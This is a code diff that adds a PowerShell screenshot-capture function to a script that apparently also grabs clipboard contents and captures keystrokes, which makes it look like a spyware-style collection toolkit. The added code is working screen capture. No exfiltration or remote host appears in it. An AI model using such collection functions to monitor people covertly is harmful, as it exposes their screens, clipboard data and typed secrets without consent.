@@ -24,6 +24,41 @@ Simply gets the raw clipboard contents via Get-Clipboard powershell cmdlet hehe 
     
 }
 
+function Invoke-Screenshot {
+
+    Param(
+        [Parameter(Mandatory = $true)][string]$Path
+    )
+
+    try {
+        $FileName = "$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png"
+        $File = Join-Path $Path $FileName
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+
+        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $Width = $Screen.Width
+        $Height = $Screen.Height
+        $Left = $Screen.Left
+        $Top = $Screen.Top
+
+        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+
+        $bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png)
+        Write-Output "Screenshot saved to: $File"
+    }
+    catch {
+        Write-Error "Failed to save screenshot. Error: $_"
+    }
+    finally {
+
+        if ($graphic) { $graphic.Dispose() }
+        if ($bitmap) { $bitmap.Dispose() }
+    }
+}
+
 function Invoke-KeyStrokeCapture {
 <#
 
